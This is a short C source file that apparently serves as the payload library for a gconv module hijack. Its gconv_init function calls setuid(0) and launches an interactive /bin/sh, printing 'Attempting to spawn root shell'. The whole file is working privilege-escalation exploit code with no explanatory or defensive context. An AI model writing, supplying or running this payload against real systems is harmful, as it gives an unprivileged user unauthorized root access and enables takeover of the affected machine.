#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
	printf("Attempting to spawn root shell\n");
	setuid(0);  // required as not all shells support -p (busybox etc.)
	char * const args[] = { "/bin/sh", "-i", NULL };
	char * const environ[] = { "PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/sbin", NULL };
	execve(args[0], args, environ);
	exit(0);
}
